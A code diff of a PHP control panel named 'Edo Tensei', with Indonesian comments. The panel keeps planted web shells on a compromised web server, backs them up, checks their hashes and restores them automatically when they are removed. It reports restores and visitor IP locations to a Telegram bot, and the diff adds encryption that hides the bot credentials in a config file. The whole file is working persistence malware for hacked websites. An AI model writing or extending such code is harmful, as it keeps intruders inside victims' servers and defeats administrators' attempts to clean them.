@@ -3,21 +3,72 @@ $DOCUMENT_ROOT = rtrim($_SERVER['DOCUMENT_ROOT'] ?? dirname($_SERVER['SCRIPT_FIL
 $configFile = __DIR__ . '/.cfg';
 $masterFile = __FILE__;
 
+// ========== FUNGSI ENKRIPSI ==========
+function getEncryptionKey() {
+    // Kombinasi unique dari server, susah ditebak
+    $serverId = md5($_SERVER['HTTP_HOST'] . $_SERVER['SERVER_SOFTWARE'] . __DIR__ . php_uname('n'));
+    return substr($serverId, 0, 16);
+}
+
+function encryptData($data) {
+    if (empty($data)) return '';
+    $key = getEncryptionKey();
+    $iv = substr(md5($key . 'edo_tensei'), 0, 16);
+    return base64_encode(openssl_encrypt($data, 'AES-128-CBC', $key, 0, $iv));
+}
+
+function decryptData($data) {
+    if (empty($data)) return '';
+    $key = getEncryptionKey();
+    $iv = substr(md5($key . 'edo_tensei'), 0, 16);
+    return openssl_decrypt(base64_decode($data), 'AES-128-CBC', $key, 0, $iv);
+}
+
 // ========== FUNGSI DASAR ==========
 function loadConfig() {
     global $configFile, $DOCUMENT_ROOT;
     if (!file_exists($configFile)) {
         return ['shells' => [], 'telegram_token' => '', 'telegram_chat_id' => '', 'telegram_enabled' => false];
     }
+    
     $config = json_decode(file_get_contents($configFile), true);
     if (!isset($config['shells'])) $config['shells'] = [];
     if (!isset($config['telegram_enabled'])) $config['telegram_enabled'] = false;
+    
+    // Decrypt Telegram credentials
+    if (isset($config['_token_enc']) && !empty($config['_token_enc'])) {
+        $config['telegram_token'] = decryptData($config['_token_enc']);
+        unset($config['_token_enc']);
+    } else {
+        $config['telegram_token'] = '';
+    }
+    
+    if (isset($config['_chat_enc']) && !empty($config['_chat_enc'])) {
+        $config['telegram_chat_id'] = decryptData($config['_chat_enc']);
+        unset($config['_chat_enc']);
+    } else {
+        $config['telegram_chat_id'] = '';
+    }
+    
     return $config;
 }
 
 function saveConfig($config) {
     global $configFile;
-    file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
+    
+    // Encrypt Telegram credentials sebelum disimpan
+    $saveConfig = $config;
+    if (!empty($config['telegram_token'])) {
+        $saveConfig['_token_enc'] = encryptData($config['telegram_token']);
+    }
+    if (!empty($config['telegram_chat_id'])) {
+        $saveConfig['_chat_enc'] = encryptData($config['telegram_chat_id']);
+    }
+    unset($saveConfig['telegram_token']);
+    unset($saveConfig['telegram_chat_id']);
+    
+    file_put_contents($configFile, json_encode($saveConfig, JSON_PRETTY_PRINT));
+    chmod($configFile, 0600); // Hanya owner yang bisa baca
 }
 
 function sendTelegram($token, $chatId, $message) {
@@ -40,11 +91,6 @@ function getIPLocation($ip) {
 }
 
 // ========== FULL AUTO-RESTORE DENGAN HASH CHECK ==========
-function getFileHash($filePath) {
-    if (!file_exists($filePath)) return null;
-    return md5_file($filePath);
-}
-
 function backupFileWithHash($filePath) {
     if (!file_exists($filePath)) return false;
     
@@ -234,7 +280,19 @@ function showPanel() {
     
     if (isset($_POST['save_shells'])) {
         $config['shells'] = array_filter(array_map('trim', $_POST['shells'] ?? []));
+        // Pertahankan Telegram credentials yang sudah ada
+        $oldToken = $config['telegram_token'] ?? '';
+        $oldChatId = $config['telegram_chat_id'] ?? '';
+        $oldEnabled = $config['telegram_enabled'] ?? false;
+        
         saveConfig($config);
+        
+        // Restore Telegram config setelah save
+        $config['telegram_token'] = $oldToken;
+        $config['telegram_chat_id'] = $oldChatId;
+        $config['telegram_enabled'] = $oldEnabled;
+        saveConfig($config);
+        
         foreach ($config['shells'] as $shell) {
             $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
             if (file_exists($absPath)) {
@@ -253,8 +311,8 @@ function showPanel() {
         if ($config['telegram_enabled'] && !empty($config['telegram_token'])) {
             $url = "https://api.telegram.org/bot{$config['telegram_token']}/setWebhook?url=" . urlencode($webhookUrl);
             @file_get_contents($url);
-            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "✅ Edo Tensei Bot Active!\n\n📡 Webhook connected\n🛡️ Monitoring enabled\n\nCommands:\n/status - Check status\n/restore - Restore all shells\n/backup - Backup all shells\n/check - Quick check\n/help - Menu");
-            echo "<script>alert('Telegram connected!');</script>";
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "✅ Edo Tensei Bot Active!\n\n📡 Webhook connected\n🛡️ Monitoring enabled (Hash Check + Auto Restore)\n\nCommands:\n/status - Check status\n/restore - Restore all shells\n/backup - Backup all shells\n/check - Quick check\n/help - Menu");
+            echo "<script>alert('Telegram connected! Credentials encrypted!');</script>";
         }
     }
     
@@ -285,7 +343,7 @@ function showPanel() {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Edo Tensei Panel</title>
+        <title>Edo Tensei Panel - Encrypted</title>
         <style>
             *{margin:0;padding:0;box-sizing:border-box;}
             body{background:#0a0c15;font-family:'Segoe UI',Arial,sans-serif;color:#eef5ff;padding:20px;}
@@ -309,14 +367,18 @@ function showPanel() {
             .badge{display:inline-block;padding:5px 12px;border-radius:20px;background:#00ff9d20;color:#00ff9d;border:1px solid #00ff9d;}
             .url-code{background:#0a0c15;padding:10px;border-radius:8px;font-family:monospace;font-size:11px;margin:5px 0;}
             .footer{text-align:center;padding:20px;color:#4a5070;}
+            .encrypt-badge{background:#ff444420;color:#ff4444;border-color:#ff4444;}
         </style>
     </head>
     <body>
         <div class="container">
             <div class="header">
                 <h1>⚡ Edo Tensei</h1>
-                <p>Auto Restore • Hash Check • Telegram Notify</p>
-                <div style="margin-top:15px;"><span class="badge">📁 <?= htmlspecialchars($DOCUMENT_ROOT) ?></span></div>
+                <p>Encrypted Config • Hash Check • Auto Restore</p>
+                <div style="margin-top:15px;">
+                    <span class="badge">📁 <?= htmlspecialchars($DOCUMENT_ROOT) ?></span>
+                    <span class="badge encrypt-badge">🔒 Credentials Encrypted</span>
+                </div>
             </div>
             <div class="grid-2">
                 <div class="card">
@@ -333,16 +395,16 @@ function showPanel() {
                     </div>
                 </div>
                 <div class="card">
-                    <div class="card-header">🤖 Telegram Bot</div>
+                    <div class="card-header">🤖 Telegram Bot <span style="font-size:10px;background:#00ff9d20;padding:2px 8px;border-radius:10px;">🔒 Encrypted Storage</span></div>
                     <div class="card-body">
                         <form method="POST">
                             <div class="form-group"><label>🤖 Bot Token</label><input type="text" name="telegram_token" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" value="<?= htmlspecialchars($config['telegram_token'] ?? '') ?>"></div>
                             <div class="form-group"><label>📱 Chat ID</label><input type="text" name="telegram_chat_id" placeholder="123456789" value="<?= htmlspecialchars($config['telegram_chat_id'] ?? '') ?>"></div>
                             <div class="form-group"><label><input type="checkbox" name="telegram_enabled" value="1" <?= ($config['telegram_enabled'] ?? false) ? 'checked' : '' ?>> ✅ Enable Telegram</label></div>
-                            <button type="submit" name="save_telegram">🔌 Connect Bot</button>
+                            <button type="submit" name="save_telegram">🔌 Connect Bot (Encrypted)</button>
                         </form>
                         <?php if (!empty($config['telegram_token']) && ($config['telegram_enabled'] ?? false)): ?>
-                        <div class="info-box" style="margin-top:15px;background:#00ff9d10;">✅ Telegram: CONNECTED<br>🤖 Bot: <?= substr($config['telegram_token'], 0, 25) ?>...<br>📱 Chat ID: <?= htmlspecialchars($config['telegram_chat_id']) ?></div>
+                        <div class="info-box" style="margin-top:15px;background:#00ff9d10;">✅ Telegram: CONNECTED & ENCRYPTED<br>🤖 Bot: <?= substr($config['telegram_token'], 0, 20) ?>...🔒<br>📱 Chat ID: <?= substr($config['telegram_chat_id'], 0, 3) . '***' . substr($config['telegram_chat_id'], -3) ?></div>
                         <?php endif; ?>
                     </div>
                 </div>
@@ -356,7 +418,7 @@ function showPanel() {
                     <div class="url-code">Manual Backup: <?= $_SERVER['SCRIPT_NAME'] ?>?backup=1</div>
                 </div>
             </div>
-            <div class="footer">Edo Tensei • Auto Restore • Hash Check • No Cronjob</div>
+            <div class="footer">Edo Tensei • Encrypted Config • Hash Check • Auto Restore • No Cronjob</div>
         </div>
     </body>
     </html>
@@ -398,7 +460,7 @@ if (isset($_GET['status'])) {
     $config = loadConfig();
     echo "=== Edo Tensei Status ===\n";
     echo "Shells: " . count($config['shells']) . "\n";
-    echo "Telegram: " . (($config['telegram_enabled'] ?? false) ? "ON" : "OFF") . "\n";
+    echo "Telegram: " . (($config['telegram_enabled'] ?? false) ? "ON (Encrypted)" : "OFF") . "\n";
     foreach ($config['shells'] as $shell) {
         $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
         $status = file_exists($absPath) ? "EXISTS" : "MISSING";
@@ -424,8 +486,8 @@ foreach ($config['shells'] as $shell) {
     }
 }
 
-// Kirim notifikasi ringkasan jika ada restore (maks 1x per request)
-if ($anyRestored && ($config['telegram_enabled'] ?? false)) {
+// Kirim notifikasi ringkasan jika ada restore
+if ($anyRestored && ($config['telegram_enabled'] ?? false) && !empty($config['telegram_token'])) {
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
     $location = getIPLocation($ip);
     
